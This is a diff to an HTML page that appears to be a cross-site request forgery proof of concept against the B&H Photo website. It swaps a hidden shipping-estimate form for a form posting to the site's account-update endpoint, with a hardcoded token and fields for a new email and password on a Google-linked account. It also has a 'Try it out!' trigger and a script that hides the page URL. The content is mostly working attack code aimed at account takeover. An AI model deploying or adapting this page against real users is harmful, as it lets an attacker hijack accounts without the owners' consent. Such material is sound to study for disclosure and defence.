@@ -21,15 +21,19 @@
 	<button onclick="doJob()">Try it out!</button>
 		
    <script>history.pushState('', '', '/')</script>
-	<iframe name="votar" style="display:none;"></iframe>
-     <form action="https://www.bhphotovideo.com/bnh/controller/home">
-      <input type="hidden" name="Q" value="json" />
-      <input type="hidden" name="O" value="" />
-      <input type="hidden" name="A" value="estimateShippingMethods" />
-      <input type="hidden" name="show" value="all" />
-      <input type="hidden" name="mergePackages" value="false" />
-      <input type="hidden" name="cartCountry" value="AF" />
-      <input type="submit" value="Submit request" />
-    </form>
+	<form method="post" class="ad_edit_form_inline socialEdit" action="https://www.bhphotovideo.com/bnh/controller/home?O=UpdateMyAccount&amp;A=UpdateUserProfile&amp;Q=socialLogin&amp;socialLogIn=googleReg" style="display: block;">
+<input type="hidden" name="section" value="5">
+<input type="hidden" name="token" value="4a7e3793108471815cea636c40f400f7">
+<div>
+<p class="fs12">By Changing your email address, you will be <span class="bold">unlinking</span> your B&amp;H account from <span class="bold">Google.</span></p>
+</div>
+<p><label>New Email:</label><input type="text" name="emailAddress" data-pi="email" class="">
+</p>
+<p><label>Password:</label><input data-selenium="socialFormPasswrod" name="password" type="password" data-pi="password" id="socialFormPassword" class="" aria-autocomplete="list">
+</p>
+<p><label>Confirm Password:</label><input data-selenium="retypedPasswordAccDetail" type="password" data-pi="password" name="retypedPassword" class="">
+</p>
+<p><label></label><input data-selenium="submitRequest" type="submit" class="button-style1" value="Submit Request"></p>
+</form>
 </body>
 </html>
